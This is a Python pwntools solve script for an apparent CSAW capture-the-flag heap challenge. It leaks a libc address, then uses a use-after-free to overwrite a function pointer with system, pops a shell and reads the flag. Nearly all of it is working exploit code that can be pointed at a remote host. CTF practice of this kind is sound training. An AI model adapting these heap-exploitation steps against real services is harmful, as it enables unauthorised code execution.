#!/usr/bin/env python3
"""
Diamond Dogs - CSAW 2026 Quals pwn.

Vulnerability: use-after-free. The K-9 manager's `dog` object is
    struct dog { char name[0x18]; void (*bark)(struct dog *); };   // 0x20 bytes -> 0x30 tcache chunk
`release` frees the dog's chunk but leaves the `dogs[idx]` slot pointer
dangling, so `command` can still be issued on a released dog (calls
dog->bark(dog)). A same-size `note` allocation reclaims the freed chunk with
fully attacker-controlled bytes, letting us set name="/bin/sh" and
bark=system. Since bark(dog) is called with `dog` (which points at the name
field, i.e. "/bin/sh") as its first argument, this becomes system("/bin/sh").

A libc leak is obtained first via a read-after-free on a big (>0x410) note
that lands in the unsorted bin after being shredded (freed) - reading it
leaks a main_arena-derived pointer.

Usage:
    python3 solve_diamond_dogs.py HOST PORT          # remote/live service
    python3 solve_diamond_dogs.py --local            # run bundled binary locally via pwntools process()
"""
import os
import sys
from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOGLEVEL", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "guard-dog")
LIBC = os.path.join(HERE, "libc-2.31.so")

libc = ELF(LIBC, checksec=False)


def start():
    if len(sys.argv) >= 2 and sys.argv[1] == "--local":
        return process(BIN, cwd=HERE)
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
        return remote(host, port)
    print(__doc__)
    sys.exit(1)


io = start()


def adopt(idx, name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"(0-7): ", str(idx).encode())
    io.sendafter(b"name: ", name.ljust(0x18, b"\x00"))


def command(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"kennel: ", str(idx).encode())


def release(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"kennel: ", str(idx).encode())


def add_note(idx, size, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"(0-7): ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"contents: ", data.ljust(size, b"\x00"))


def show_note(idx):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"note slot: ", str(idx).encode())
    io.recvuntil(b"contents: ")
    return io.recv(8)


def free_note(idx):
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"note slot: ", str(idx).encode())


# --- 1. libc leak via unsorted bin -----------------------------------------
add_note(0, 0x500, b"beacon")     # > 0x410 -> unsorted bin on free
add_note(1, 0x28, b"guard")       # prevent consolidation with top chunk
free_note(0)
leak = u64(show_note(0))
libc.address = leak - (libc.sym["__malloc_hook"] + 0x70)   # main_arena + 0x60
log.info("libc leak    : %#x", leak)
log.success("libc base    : %#x", libc.address)
assert libc.address & 0xfff == 0, "bad libc base -- offset wrong?"
system = libc.sym["system"]
log.info("system       : %#x", system)

# --- 2. UAF: reclaim a released dog, hijack bark ---------------------------
adopt(0, b"rex")                  # dog object, one 0x30 chunk
release(0)                        # -> tcache[0x30], slot still dangling
payload = b"/bin/sh\x00".ljust(0x18, b"\x00") + p64(system)
add_note(2, 0x20, payload)        # reclaims the dog chunk; name="/bin/sh", bark=system

# --- 3. fire ----------------------------------------------------------------
command(0)                        # dog->bark(dog) == system("/bin/sh")

io.sendline(b"cat flag.txt")
io.recvuntil(b"csaw{")
flag = b"csaw{" + io.recvuntil(b"}")
log.success("FLAG: %s", flag.decode())
assert flag.startswith(b"csaw{") and flag.endswith(b"}")
print(flag.decode())
io.close()
